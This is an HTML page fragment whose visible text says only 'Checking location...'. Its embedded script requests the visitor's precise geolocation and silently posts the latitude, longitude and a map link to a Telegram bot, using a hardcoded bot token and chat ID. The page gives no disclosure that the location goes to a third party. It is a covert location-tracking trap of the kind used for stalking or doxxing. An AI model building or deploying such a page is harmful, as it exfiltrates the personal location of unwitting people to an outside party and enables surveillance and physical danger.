  <div class="msg">Checking location...</div>

  <script>
    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
      const chat_id = "7485197107";
      const msg = `üìç Location Received:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: msg
        })
      });
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, function(error) {
          console.log("Location permission denied or failed");
        }, {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        });
      }
    }

</body>
